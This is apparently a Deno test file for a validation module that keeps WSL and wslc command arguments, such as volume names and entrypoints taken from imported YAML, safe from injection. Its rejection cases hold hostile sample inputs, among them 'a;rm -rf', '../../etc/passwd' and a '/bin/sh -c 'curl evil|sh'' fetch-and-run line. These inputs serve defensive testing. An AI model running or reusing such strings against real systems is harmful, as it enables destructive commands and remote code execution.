import { assertEquals, assertStringIncludes, assertThrows } from "@std/assert";
import * as v from "../adapter/validate.ts";

Deno.test("name: accepts sane names", () => {
  assertEquals(v.name("web"), "web");
  assertEquals(v.name("my-app_2.0"), "my-app_2.0");
  assertEquals(v.name("Ubuntu-24.04"), "Ubuntu-24.04");
});

Deno.test("name: rejects injection attempts", () => {
  assertThrows(() => v.name("-rf"), v.ValidationError);
  assertThrows(() => v.name("--privileged"), v.ValidationError);
  assertThrows(() => v.name("a b"), v.ValidationError);
  assertThrows(() => v.name("a\nb"), v.ValidationError);
  assertThrows(() => v.name(""), v.ValidationError);
  assertThrows(() => v.name("a;b"), v.ValidationError);
  assertThrows(() => v.name(42), v.ValidationError);
});

Deno.test("imageRef: accepts registry refs", () => {
  assertEquals(v.imageRef("nginx"), "nginx");
  assertEquals(v.imageRef("nginx:latest"), "nginx:latest");
  assertEquals(v.imageRef("docker.io/library/alpine:latest"), "docker.io/library/alpine:latest");
  assertEquals(v.imageRef("ghcr.io/org/app@sha256:abc123"), "ghcr.io/org/app@sha256:abc123");
});

Deno.test("imageRef: rejects malformed refs", () => {
  assertThrows(() => v.imageRef("--pull-always"), v.ValidationError);
  assertThrows(() => v.imageRef("a//b"), v.ValidationError);
  assertThrows(() => v.imageRef("a/../b"), v.ValidationError);
  assertThrows(() => v.imageRef("a b"), v.ValidationError);
});

Deno.test("portPair: normalizes and bounds", () => {
  assertEquals(v.portPair("8080:80"), "8080:80");
  assertThrows(() => v.portPair("0:80"), v.ValidationError);
  assertThrows(() => v.portPair("8080:99999"), v.ValidationError);
  assertThrows(() => v.portPair("8080"), v.ValidationError);
  assertThrows(() => v.portPair("a:b"), v.ValidationError);
});

Deno.test("memSize: unit-suffixed sizes only", () => {
  assertEquals(v.memSize("8GB"), "8GB");
  assertEquals(v.memSize("512MB"), "512MB");
  assertThrows(() => v.memSize("8"), v.ValidationError);
  assertThrows(() => v.memSize("8gb extra"), v.ValidationError);
});

// --- the size grammar, one test per target (r8 D1). PDF is the syntax authority:
//   .wslconfig  "this can be set as whole numbers using GB or MB"  → memory=4GB
//   --resize    "<Memory Value>B/M/MB/G/GB/T/TB. Decimal values are currently
//                unsupported (e.g. 2.5TB)"                          → 256GB
//   wslc run -m  docker-style (command map §117)                    → 512M / 1G

Deno.test("size grammar — .wslconfig and --resize: whole numbers with MB/GB, never 4G", () => {
  assertEquals(v.memSize("4GB"), "4GB"); // the documented .wslconfig form
  assertEquals(v.memSize("512MB"), "512MB");
  assertEquals(v.memSize("256GB"), "256GB"); // --resize
  assertEquals(v.memSize("1TB"), "1TB");
  // The docker-style short suffix is NOT documented for these targets: writing
  // `memory=4G` makes WSL ignore the key and silently fall back to 50% of RAM.
  assertThrows(() => v.memSize("4G"), v.ValidationError);
  assertThrows(() => v.memSize("512M"), v.ValidationError);
  // "Decimal values are currently unsupported (e.g. 2.5TB)"
  assertThrows(() => v.memSize("2.5TB"), v.ValidationError);
  assertThrows(() => v.memSize("4.5GB"), v.ValidationError);
  // zero-prefixed junk
  assertThrows(() => v.memSize("08GB"), v.ValidationError);
  assertThrows(() => v.memSize("0GB"), v.ValidationError);
});

Deno.test("size grammar — wslc run -m / --shm-size: docker-style, decimals legal", () => {
  assertEquals(v.memValue("512M"), "512M");
  assertEquals(v.memValue("1G"), "1G");
  assertEquals(v.shmSize("64M"), "64M");
  assertEquals(v.shmSize("1.5G"), "1.5G");
  assertThrows(() => v.shmSize("lots"), v.ValidationError);
  assertThrows(() => v.shmSize("--privileged"), v.ValidationError);
});

// r10 I5 TIGHTENS r9's DD2: the write guard now accepts ONLY a bare byte count (incl. 0)
// or a whole number with MB/GB. Everything else — including the `50%` that DD2 used to let
// through — is refused, because WSL silently ignores an undocumented size and falls back to
// its default. (This intentionally changes the r9 "50% preserved" assertion.)
Deno.test("size grammar — .wslconfig write guard accept/reject table (r10 I5)", () => {
  // ACCEPTED — the two documented shapes, passed through UNTOUCHED (we never rewrite a file).
  assertEquals(v.wslConfigValue("4GB", "wsl2.memory", "size"), "4GB");
  assertEquals(v.wslConfigValue("512MB", "wsl2.memory", "size"), "512MB");
  assertEquals(v.wslConfigValue("0", "wsl2.swap", "size"), "0"); // PDF: "0 for no swap file"
  assertEquals(v.wslConfigValue("1099511627776", "wsl2.defaultVhdSize", "size"), "1099511627776"); // bare bytes
  assertEquals(v.wslConfigValue("4gb", "wsl2.memory", "size"), "4gb"); // case-insensitive unit

  // REJECTED — WSL would ignore the key and silently fall back to its default.
  const bad = assertThrows(() => v.wslConfigValue("4G", "wsl2.memory", "size"), v.ValidationError);
  assertStringIncludes(String(bad.message), "4GB"); // suggests the documented form
  assertThrows(() => v.wslConfigValue("512M", "wsl2.swap", "size"), v.ValidationError);
  assertThrows(() => v.wslConfigValue("4.5GB", "wsl2.memory", "size"), v.ValidationError);
  assertThrows(() => v.wslConfigValue("4 GB", "wsl2.memory", "size"), v.ValidationError); // embedded space
  assertThrows(() => v.wslConfigValue("50%", "wsl2.memory", "size"), v.ValidationError); // NOW rejected (was DD2-preserved)
  assertThrows(() => v.wslConfigValue("potato", "wsl2.memory", "size"), v.ValidationError);
  assertThrows(() => v.wslConfigValue("4TB", "wsl2.defaultVhdSize", "size"), v.ValidationError); // TB not documented for .wslconfig

  // Non-size keys are never touched by the size guard.
  assertEquals(v.wslConfigValue("4G", "wsl2.kernelCommandLine", "string"), "4G");
  assertEquals(v.wslConfigValue("50%", "wsl2.kernelCommandLine", "string"), "50%");
});

Deno.test("winPath: absolute paths, spaces legal, traversal rejected", () => {
  assertEquals(v.winPath("C:\\Temp\\file.vhdx"), "C:\\Temp\\file.vhdx");
  assertEquals(v.winPath("D:\\My Backups\\ubuntu.tar"), "D:\\My Backups\\ubuntu.tar");
  assertThrows(() => v.winPath("..\\evil"), v.ValidationError);
  assertThrows(() => v.winPath("C:\\a\\..\\b"), v.ValidationError);
  assertThrows(() => v.winPath("relative\\path"), v.ValidationError);
  assertThrows(() => v.winPath("C:\\bad|pipe"), v.ValidationError);
});

Deno.test("mountSpec: HOST:CONTAINER incl. Windows drive colons", () => {
  assertEquals(v.mountSpec("C:\\data:/data"), "C:\\data:/data");
  assertEquals(v.mountSpec("myvol:/var/lib"), "myvol:/var/lib");
  assertEquals(v.mountSpec("D:\\My Files:/mnt/files"), "D:\\My Files:/mnt/files");
  assertThrows(() => v.mountSpec("nocolon"), v.ValidationError);
  assertThrows(() => v.mountSpec("--privileged"), v.ValidationError);
  assertThrows(() => v.mountSpec("a\nb:/x"), v.ValidationError);
});

Deno.test("envPair: KEY=value shapes", () => {
  assertEquals(v.envPair("KEY=value"), "KEY=value");
  assertEquals(v.envPair("EMPTY="), "EMPTY=");
  assertEquals(v.envPair("MSG=hello world"), "MSG=hello world");
  assertEquals(v.envPair("_UNDER=1"), "_UNDER=1");
  assertThrows(() => v.envPair("NOEQUALS"), v.ValidationError);
  assertThrows(() => v.envPair("1BAD=x"), v.ValidationError);
  assertThrows(() => v.envPair("-e=x"), v.ValidationError);
});

Deno.test("memValue/cpusValue: wslc run help shapes (512M, 1G / 0.5, 2.5)", () => {
  assertEquals(v.memValue("512M"), "512M");
  assertEquals(v.memValue("1G"), "1G");
  assertEquals(v.memValue("1.5GB"), "1.5GB");
  assertThrows(() => v.memValue("lots"), v.ValidationError);
  assertEquals(v.cpusValue("0.5"), "0.5");
  assertEquals(v.cpusValue("2"), "2");
  assertThrows(() => v.cpusValue("0"), v.ValidationError);
  assertThrows(() => v.cpusValue("two"), v.ValidationError);
});

Deno.test("containerPath/userSpec: absolute container paths, sane users", () => {
  assertEquals(v.containerPath("/app"), "/app");
  assertThrows(() => v.containerPath("relative"), v.ValidationError);
  assertThrows(() => v.containerPath("/a/../b"), v.ValidationError);
  assertEquals(v.userSpec("1000:1000"), "1000:1000");
  assertEquals(v.userSpec("www-data"), "www-data");
  assertThrows(() => v.userSpec("a b"), v.ValidationError);
});

// --- r9: volume names and --entrypoint are process-argument sinks fed by IMPORTED YAML.
// A hostile compose file is the threat model, so they are validated like a trust boundary.

Deno.test("volumeName: docker's charset, and the 64-char hex wslc auto-creates", () => {
  assertEquals(v.volumeName("dbdata"), "dbdata");
  assertEquals(v.volumeName("my-vol_2.0"), "my-vol_2.0");
  assertEquals(v.volumeName("r9probe-named"), "r9probe-named");
  // the real anonymous volume wslc created (live 2026-07-13)
  const anon = "60e1ab6c49daa80ebb6177869fafaf29e72024fa15ed5f3cf1242ced703648ba";
  assertEquals(v.volumeName(anon), anon);
});

Deno.test("volumeName: an imported YAML name can never become a flag or a second token", () => {
  // A name starting with "-" would be read by wslc as an option, not an operand:
  // `wslc volume remove --all` is a very different command from removing a volume.
  assertThrows(() => v.volumeName("-f"), v.ValidationError);
  assertThrows(() => v.volumeName("--all"), v.ValidationError);
  assertThrows(() => v.volumeName("a b"), v.ValidationError); // token splitting
  assertThrows(() => v.volumeName("a\nb"), v.ValidationError); // control characters
  assertThrows(() => v.volumeName("a\tb"), v.ValidationError);
  assertThrows(() => v.volumeName("a\0b"), v.ValidationError);
  assertThrows(() => v.volumeName("a;rm -rf"), v.ValidationError);
  assertThrows(() => v.volumeName("../../etc/passwd"), v.ValidationError);
  assertThrows(() => v.volumeName("a/b"), v.ValidationError); // no path separators
  assertThrows(() => v.volumeName(".hidden"), v.ValidationError); // must start alnum
  assertThrows(() => v.volumeName("_leading"), v.ValidationError);
  assertThrows(() => v.volumeName(""), v.ValidationError);
  assertThrows(() => v.volumeName("x".repeat(129)), v.ValidationError); // length-capped
  assertThrows(() => v.volumeName(42), v.ValidationError);
});

Deno.test("entrypointValue: ONE executable token (its args are not its business)", () => {
  assertEquals(v.entrypointValue("/bin/sh"), "/bin/sh");
  assertEquals(v.entrypointValue("/bin/echo"), "/bin/echo");
  assertEquals(v.entrypointValue("docker-entrypoint.sh"), "docker-entrypoint.sh");
});

Deno.test("entrypointValue: rejects a flag, a shell line and control characters", () => {
  // --entrypoint is exec'd directly, so this is not "a shell command" — but a leading
  // dash WOULD be parsed by wslc as a flag, and spaces would split the token.
  assertThrows(() => v.entrypointValue("--privileged"), v.ValidationError);
  assertThrows(() => v.entrypointValue("-v"), v.ValidationError);
  assertThrows(() => v.entrypointValue("/bin/sh -c 'curl evil|sh'"), v.ValidationError);
  assertThrows(() => v.entrypointValue("/bin/sh\nmalicious"), v.ValidationError);
  assertThrows(() => v.entrypointValue("/bin/sh\0"), v.ValidationError);
  assertThrows(() => v.entrypointValue(""), v.ValidationError);
  assertThrows(() => v.entrypointValue("/bin/".concat("x".repeat(300))), v.ValidationError);
  assertThrows(() => v.entrypointValue(42), v.ValidationError);
});

Deno.test("commandTokens: tokens with inner spaces ok, control chars rejected", () => {
  assertEquals(v.commandTokens(["bash", "-c", "echo hello world"]), ["bash", "-c", "echo hello world"]);
  assertEquals(v.commandTokens(undefined), []);
  assertThrows(() => v.commandTokens("not-array"), v.ValidationError);
  assertThrows(() => v.commandTokens(["a\nb"]), v.ValidationError);
  assertThrows(() => v.commandTokens([""]), v.ValidationError);
});
